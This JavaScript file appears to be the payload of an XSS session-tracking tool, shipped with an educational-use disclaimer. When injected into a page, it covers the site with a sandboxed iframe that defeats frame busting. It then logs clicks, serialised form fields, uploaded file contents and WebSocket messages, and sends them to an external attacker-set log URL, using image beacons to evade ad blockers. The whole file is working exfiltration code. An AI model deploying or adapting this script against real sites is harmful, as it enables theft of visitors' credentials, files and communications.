/**
 * Configurable tracking script
 * @author Krzysztof Kotowicz <kkotowicz at gmail dot com>
 * @see http://blog.kotowicz.net
 *
 * THIS FILE IS PART OF THE PROJECT FOR EDUCATIONAL USE *ONLY*
 * ANY COMMERCIAL USE, E.G. FOR VULNERABILITY ASSESSMENT,
 * PENETRATION TESTING IS PROHIBITED - CONTACT THE AUTHOR FOR PERMISSION
 *
 * PERFORMING ACTUAL ATTACKS ON WEBSITES NOT OWNED BY YOU
 * USING THIS PROJECT IS PROHIBITED!
 *
 * To configure the tracker use script URL parameters like so:)
 * <script src="http://example.com/track.js?log=http%3A%2F%2Fwhatever%2Flog.php&amp;site=youtube.com"></script>
 *
 * Parameters:
 * log - external absolute URL used to log events performed on targetted site
 *       (defaults to log.php in the same location as track.js)
 * start - starting frame URL (e.g. targetted site home page)
 *       (defaults to current location without query params)
 * site - site id (optional) - used to enable logs from different sites simultaneously
 * observe - jQuery selector to look for in pages. If it's present, it's HTML content will be logged
 * files - if set, will also try to capture files uploaded to victim site (requires XMLHttpRequest Level 2 support)
 * websocket - if set, will also try to dump communications over WebSockets
 * debug - if set, events will be logged to a console, instead of reported to 'log'
 */
(function() {

	try {
		if (window.parent && window.parent.document.getElementById('_track')) {
			// we already are in xss-track iframe (stored xss), abort
			return;
		}
	} catch(e) {}

	function parseQuery (query) {
		   var Params = {};
		   if (!query) { return Params; } // return empty object
		   var Pairs = query.split(/[;&]/);
		   for (var i = 0; i < Pairs.length; i++) {
		      var KeyVal = Pairs[i].split('=');
		      if (!KeyVal || KeyVal.length != 2) {continue;}
		      var key = unescape(KeyVal[0]);
		      var val = unescape(KeyVal[1]);
		      val = val.replace(/\+/g, ' ');
		      Params[key] = val;
		   }
		   return Params;
	}

	var scripts = document.getElementsByTagName('script');
	var myScript = scripts[ scripts.length - 1 ];
	var scriptUrl = myScript.src.replace(/\?.*/, '');
	var queryString = myScript.src.replace(/^[^\?]+\??/,'');
	var params = parseQuery(queryString);

	var startUrl = params.start || location.href.replace(/\?.*/,'');
	var logUrl = params.log || scriptUrl.replace(/\/track.js/, '/log.php');
	var observeSelector = params.observe || null;
	var captureFiles = params.files || null;
	var captureWebsocket = params.websocket || null;

	function log(what) {
		if (params.debug) {
			console.log(what);
			return;
		}

		what._ = Math.random(); // avoid caching
		if (params.site) {
			what.site = params.site;
		}
		try {
		    $.get(logUrl, what); // try with ajax first
		                         //, but you might get into cross domain issues
		                         // on older browsers (or IE)
		} catch (e) {
			// image
			var i = new Image();
			// encode to avoid adblock plus filters
			i.src = logUrl + '?' + encodeURIComponent($.param(what));
			$(i).load(function() {$(this).remove();}).appendTo('body');
		}
	}

	var getPath = function(url) {
		return url.match(/(\/.*)/)[1];
	};

	var changeAddressBar = function(url) {
		try {
			// html5 goodness - should work in Safari, Chrome, FF 4
			window.history.pushState({}, "", getPath(url));
		} catch(e) {}
	};

	var init = function() {
		$('body').children().hide();

		var i = $('<iframe id=_track>')
			.css({
				position: 'absolute',
				width: '100%',
				height: '100%',
				top: 0,
				left: 0,
				border: 0,
				background: '#fff'
				})
		    .attr('sandbox', 'allow-same-origin allow-forms allow-scripts') // anti frame busting with HTML5 power :) allow-top-navigation is disabled
		    .appendTo('body')
			.load(function() {
				var height=null,location = null;

				try {
					location = this.contentDocument.location.href;
					height = (this.contentWindow.innerHeight||0)+(this.contentWindow.scrollMaxY||0);
					var openf = this.contentWindow.open;
					// proxy for window.open()
					this.contentWindow.open = function(url) {
						log({event: 'open', 'from': location, 'href': arguments[0], 'arguments': $.makeArray(arguments).slice(1)});
						return openf.apply(this, $.makeArray(arguments));
					};
				} catch(e) {}

				log({event: 'load', 'href': location, 'height': height});

				// hijack links and forms
				$('body',this.contentDocument)
				.find('a')
					.click(function() {
						log({event:'click', 'from': location, 'href': this.href, 'target': this.target});
						changeAddressBar(this.href);
					})
				.end()
				.find('form')
					.submit(function() {
						log({event: 'submit',
							 from: location,
							 action: $(this).attr('action') || location,
							 fields: $(this).serialize()
						   });
					})
				.end();
				if (observeSelector && $(observeSelector, this.contentDocument).length) {
					// we found the selector
					$(observeSelector, this.contentDocument).each(function() {
						var clone = $(this).clone();
						log({event: 'found',
							 selector: observeSelector,
							 from: location,
							 'content': clone.wrap('<div>').parent().html()
						    });
						clone.remove();
					});
				}

				if (captureFiles && FileList) { // XMLHttpReqest Level 2 required

					var doCaptureFiles = function() {
						if (this.files && this.files.length) {
							var event, fd;
							for (var i=0; i < this.files.length; i++) {
								// first send the metadata
								if (this.files[i].name === undefined) { // partial support only, abort
									return;
								}
								event = {event: 'file_meta',
										 from: location,
										 input_name: this.name,
										 name: this.files[i].name,
										 type: this.files[i].type,
										 size: this.files[i].size
									   };
								log(event);
							}
							if (typeof FormData !== 'undefined') {
								for (i=0; i < this.files.length; i++) {
									// send file contents
									try {
										fd = new FormData();
										fd.append('event', 'file');
										fd.append('from', 'location');
										fd.append('input_name', this.name);
										fd.append('name', this.files[i].name);
										fd.append('type', this.files[i].type);
										fd.append('size', this.files[i].size);
										fd.append('contents', this.files[i]);
										var xml = new XMLHttpRequest();
										xml.open("POST", logUrl, true);
										xml.send(fd);
									} catch (e) {
									}
								}
							}
						}
					};

					// would do it with live('change'), but FF 4.0 beta 7 seems to ignore this
					$('input[type=file]',this.contentDocument).change(doCaptureFiles);
				}

				if (captureWebsocket && window.WebSocket) {

					// add logging onmessage listener
					function captureRecv(ws) {
						if (typeof ws.captured == 'undefined') {
							ws.addEventListener('message', function(e) {
								var event = {
										event: 'websocket_recv',
										from: location,
										data: e.data,
										url: e.target.URL
								}
								log(event);
							});
							ws.captured = true;
						}
					}

					// capture sending
					var captureSend = this.contentWindow.WebSocket.prototype.send = function() {
						captureRecv(this); // in case socket contruction was before constructor switching
						var event = {
								event: 'websocket_send',
								from: location,
								data: arguments[0],
								url: this.URL
						};

						log(event);
						return window.WebSocket.prototype.send.apply(this, arguments);
					}

					// capture constructor
					this.contentWindow.WebSocket = function(a,b) {
						var base;
						base = (typeof b !== "undefined") ? new WebSocket(a,b) : new WebSocket(a);
						captureRecv(base);
						base.send = captureSend;
						this.__proto__ = WebSocket.constructor;
						return base;
					}
				}
			});

		i.attr('src', startUrl);
		changeAddressBar(startUrl);
		log({event: 'start', 'url': startUrl});
	};

	function pollJQuery() {
		if (typeof(jQuery) !== 'undefined') {
			clearInterval(interval);
			init(); // we have jquery, init
		}
	}

	 //if the jQuery object isn't available
    if (typeof(jQuery) == 'undefined') {
        // load it
        var s = document.createElement('script');
        s.src = "http://ajax.googleapis.com/ajax/libs/jquery/1.4.3/jquery.min.js";
        document.body.appendChild(s);
        var interval = setInterval(pollJQuery, 200); // check every 200 ms
    } else {
        init(); // init immediately
    }
})();